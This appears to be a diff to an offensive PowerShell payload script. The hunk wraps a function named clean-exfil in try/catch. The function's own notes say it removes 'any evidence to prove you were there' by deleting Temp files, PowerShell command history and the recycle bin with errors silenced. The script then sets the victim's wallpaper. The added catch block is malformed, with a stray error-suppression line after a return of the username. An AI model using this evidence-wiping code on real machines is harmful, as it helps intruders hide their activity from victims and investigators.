@@ -385,7 +385,7 @@ function clean-exfil {
 .NOTES 
 	This is to clean up behind you and remove any evidence to prove you were there
 #>
-
+try {
 # Delete contents of Temp folder 
 
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
@@ -403,7 +403,12 @@ Remove-Item (Get-PSreadlineOption).HistorySavePath
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 }
+}
 
+catch {Write-Error "Can not do clean exfil" 
+return $env:UserName
+-ErrorAction SilentlyContinue
+}
 #----------------------------------------------------------------------------------------------------
  
 Set-WallPaper -Image "$Env:USERPROFILE\Desktop\$ImageName.jpg" -Style Center
